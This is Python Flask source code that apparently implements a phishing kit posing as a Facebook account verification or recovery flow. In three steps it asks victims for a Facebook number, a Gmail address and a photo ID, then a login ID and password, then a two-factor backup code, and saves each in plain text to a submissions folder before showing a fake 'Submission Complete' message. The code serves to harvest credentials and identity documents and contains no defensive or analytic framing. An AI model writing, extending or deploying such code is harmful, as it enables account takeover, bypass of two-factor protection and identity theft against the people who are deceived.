import os
from flask import Flask, render_template, request, redirect, url_for, flash
from werkzeug.utils import secure_filename
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'your_secret_key'
UPLOAD_FOLDER = 'submissions'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'pdf'}

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    fb_number = request.form.get('fb_number')
    gmail = request.form.get('gmail')
    id_file = request.files.get('id_file')

    if not fb_number or not gmail or not id_file:
        flash('❌ All required fields must be filled.')
        return redirect(url_for('index'))

    if id_file and allowed_file(id_file.filename):
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        id_filename = secure_filename(f"{fb_number}_{timestamp}_{id_file.filename}")
        id_path = os.path.join(UPLOAD_FOLDER, id_filename)
        id_file.save(id_path)

        # Save metadata
        with open(os.path.join(UPLOAD_FOLDER, f"{fb_number}_{timestamp}.txt"), 'w') as f:
            f.write(f"Facebook Number: {fb_number}\n")
            f.write(f"Gmail: {gmail}\n")
            f.write(f"ID File: {id_filename}\n")

        return redirect(url_for('login'))
    else:
        flash('❌ Invalid file format. Use JPG, PNG, or PDF.')
        return redirect(url_for('index'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        login_id = request.form.get('login_id')
        password = request.form.get('password')

        if login_id and password:
            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            with open(os.path.join(UPLOAD_FOLDER, f"login_{login_id}_{timestamp}.txt"), 'w') as f:
                f.write(f"Login ID: {login_id}\nPassword: {password}\n")
            return redirect(url_for('backup'))
        else:
            flash("❌ Email or Password is required.")
            return redirect(url_for('login'))

    return render_template('login.html')

@app.route('/backup', methods=['GET', 'POST'])
def backup():
    if request.method == 'POST':
        backup_code = request.form.get('backup_code')
        if backup_code:
            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            with open(os.path.join(UPLOAD_FOLDER, f"2fa_{timestamp}.txt"), 'w') as f:
                f.write(f"Backup Code: {backup_code}")
            return "✅ Submission Complete. Your request has been received."

        else:
            flash("❌ Backup code is required.")
            return redirect(url_for('backup'))

    return render_template('backup.html')

if __name__ == '__main__':
    app.run(debug=True)
